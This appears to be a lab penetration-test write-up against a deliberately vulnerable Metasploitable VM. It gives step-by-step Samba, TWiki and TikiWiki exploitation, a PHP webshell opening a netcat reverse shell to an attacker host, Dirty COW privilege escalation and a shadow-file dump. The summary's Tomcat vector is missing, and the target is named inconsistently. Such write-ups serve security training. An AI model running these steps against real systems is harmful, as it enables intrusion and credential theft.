Executive Summary

Metasploitable 1 was compromised through four independent attack vectors: a Samba usermap_script vulnerability granting direct root access, a TWiki RCE exploit yielding a web shell, Apache Tomcat manager WAR deployment producing a Meterpreter session, and a TikiWiki backup upload chain delivering a reverse shell. Post-exploitation privilege escalation to root was achieved via the Dirty COW kernel exploit (CVE-2016-5195) on non-root shells, and /etc/shadow was successfully dumped on all vectors.

Reconnaissance

Objective

Identify live hosts on the local network, discover open ports, and fingerprint running services and the OS to determine viable attack vectors.

Findings

Host discovery was performed with arp-scan -l, which revealed the Metasploitable 2 target at 192.168.8.243. A full service and OS fingerprint scan was then run with nmap -sV -O 192.168.8.243, identifying a broad attack surface including FTP (21), SSH (22), SMTP (25), HTTP (80), Samba (139/445), MySQL (3306), PostgreSQL (5432), AJP (8009), and Apache Tomcat on port 8180, among others. The OS was fingerprinted as Linux 2.6.24-16-server.

PoC:
- Tools used: arp-scan, Nmap
- Commands: arp-scan -l → nmap -sV -O 192.168.8.243
- Result: Target at 192.168.8.243 confirmed; 20+ open ports identified; OS = Linux 2.6.24-16-server (Ubuntu); Samba 3.0.20-Debian, Apache httpd 2.2.8, MySQL 5.0.51a, Apache Tomcat/Coyote JSP 1.1 on :8180 noted as key targets.

Attack Vector 1 — Samba (CVE-2007-2447)

Enumeration

Objective

Enumerate Samba shares and version details to identify exploitable misconfigurations or known vulnerabilities.

Findings

enum4linux 192.168.8.243 was run for null-session SMB enumeration, revealing the workgroup name, OS version, Samba version (3.0.20-Debian), user accounts, and share listings.

PoC:
- Tools used: enum4linux
- Commands: enum4linux 192.168.8.243
- Result: Null session successful; workgroup WORKGROUP; Samba 3.0.20-Debian confirmed; user accounts and share names enumerated.

Exploitation

Description

Samba 3.0.20 through 3.0.25rc3 is vulnerable to CVE-2007-2447, a command injection flaw in the MS-RPC SamrChangePassword function via the username field. When the username map script option is enabled in smb.conf (as it is on Metasploitable 2), a crafted username is passed to /bin/sh, resulting in arbitrary command execution as root without authentication.

PoC — Steps to Reproduce

  1. Launch Metasploit and load the exploit: use exploit/multi/samba/usermap_script
  2. Set the target: set RHOSTS 192.168.8.243
  3. Set the payload: set PAYLOAD cmd/unix/reverse
  4. Set the listener: set LHOST <ATTACKER_IP>
  5. Run the exploit: exploit
  6. Receive a reverse shell — confirm privilege with id (returns uid=0(root))

Attack Vector 2 — TWiki RCE

Enumeration

Objective

Enumerate web directories on port 80 and identify exploitable web applications.

Findings

gobuster dir was run against http://192.168.8.243 with a standard wordlist, uncovering /twiki among other directories. Navigating to the TWiki instance revealed version 20030201. searchsploit twiki was used to identify available exploits, surfacing the 642.pl script for TWiki RCE.

PoC:
- Tools used: gobuster, searchsploit
- Commands: gobuster dir -u http://192.168.8.243 -w /usr/share/wordlists/dirb/common.txt
- Result: /twiki directory identified; TWiki version 20030201 confirmed; CVE applicable via exploits/cgi-bin/642.pl.

Exploitation

Description

TWiki 20030201 contains a remote code execution vulnerability in the search functionality. The 642.pl exploit script sends a crafted request to the TWiki CGI endpoint that passes user-supplied input unsanitized to a shell command, resulting in arbitrary command execution as the web server user (www-data).

PoC — Steps to Reproduce

  1. Copy the exploit: searchsploit -m exploits/cgi-bin/642.pl
  2. Execute the exploit against the TWiki search endpoint, passing a reverse shell payload as the command argument.
  3. Catch the incoming shell on a Netcat listener: nc -lvnp <port>
  4. Confirm access: id returns uid=33(www-data)

Attack Vector 4 — TikiWiki 1.9.5

Enumeration

Objective

Enumerate the TikiWiki application on port 80, map its directory structure, and extract database credentials to identify further exploitation paths.

Findings

gobuster dir was run against http://192.168.8.243/tikiwiki with a large wordlist, revealing key directories including /backups, /files, /db, and /lib. The /backups path in particular was noted as a potential upload and retrieval vector. The Metasploit auxiliary/admin/tikiwiki/tikidblib module was then run against the TikiWiki instance, exploiting a known information disclosure vulnerability to extract the database name (tikiwiki195) and credentials ([REDACTED]). These credentials were subsequently used with mysql -h 192.168.8.243 -u root --ssl=0 to connect to MySQL and enumerate the TikiWiki database schema and user table.

PoC:
- Tools used: gobuster, Metasploit (tikidblib), MySQL client
- Commands: gobuster dir -u http://192.168.8.243/tikiwiki -w /usr/share/wordlists/dirb/big.txt (directory enumeration); use auxiliary/admin/tikiwiki/tikidblib → set RHOSTS 192.168.8.243 → run (credential extraction)
- Result: /backups directory discovered; TikiWiki database credentials extracted; MySQL access confirmed; tikiwiki195 database enumerated.

Exploitation

Description

TikiWiki 1.9.5 allows authenticated users with file upload permissions to upload files through the backup/restore functionality. By uploading a PHP webshell disguised as a legitimate file, an attacker can gain remote code execution as www-data. The shell is accessed via the web server, and a Netcat reverse shell is then used to establish an interactive session.

PoC — Steps to Reproduce

  1. Log in to TikiWiki using credentials extracted during enumeration.
  2. Upload a PHP command shell (shell.php) via the backup upload feature: <?php system("id"); ?>
  3. Access it via the browser to confirm:

    http://192.168.8.243/tikiwiki/backups/shell.php — returns uid=33(www-data).

  4. Upload a reverse shell webshell (shell2.php): <?php system("nc <ATTACKER_IP> 4444 -e /bin/bash"); ?>
  5. Start a listener: nc -lvnp 4444
  6. Trigger the reverse shell by accessing:

    http://192.168.8.243/tikiwiki/backups/shell2.php

  7. Receive shell as www-data.
  8. Upgrade to PTY: python -c 'import pty; pty.spawn("/bin/bash")'

Post-Exploitation

Objective

Escalate privileges from service-level accounts (www-data, tomcat55) to root, and demonstrate full system compromise by reading /etc/shadow.

Privilege Escalation — Dirty COW (CVE-2016-5195)

Description

The kernel version (2.6.24-16-server) is vulnerable to CVE-2016-5195 (Dirty COW), a race condition in the Linux kernel’s copy-on-write mechanism. The exploit modifies a read-only memory-mapped file (in this case /etc/passwd) by racing two threads — one writing to /proc/self/mem and one triggering copy-on-write. This allows an unprivileged user to overwrite the root password entry and escalate to root.

PoC — Steps to Reproduce

  1. Transfer the exploit source to the target: download linux/local/40839.c from searchsploit and transfer via a Python HTTP server or wget.
  2. Compile on the target: gcc 40839.c -o exploit2 -lpthread -lcrypt
  3. Execute: ./exploit2
  4. The exploit overwrites the root entry in /etc/passwd with a new password hash.
  5. Switch to root: su root with the new password set by the exploit.
  6. Confirm: id returns uid=0(root)

Shadow File Dump

With root access confirmed, /etc/shadow was read to demonstrate full system compromise and credential access.

  • Command: cat /etc/shadow

Lessons Learned

Metasploitable 1 demonstrates how a single network-accessible host can present multiple independently exploitable attack surfaces simultaneously. The Samba usermap_script flaw (CVE-2007-2447) is a reminder that legacy SMB configurations with username map script enabled are trivially exploitable — any exposure of Samba 3.0.20 on a network is a critical finding requiring immediate patching or isolation. Default credentials on Apache Tomcat Manager ([REDACTED]:[REDACTED]) remain one of the most common real-world findings; Manager interfaces should never be internet-facing and should always require strong, unique credentials. The TikiWiki chain illustrates how database credential disclosure combined with file upload functionality chains into full RCE without needing a memory corruption exploit. Finally, the Dirty COW kernel exploit (CVE-2016-5195) underscores the importance of kernel patching — a Linux 2.6 kernel in a 2016+ environment is years out of support and trivially escalated regardless of service-level hardening.
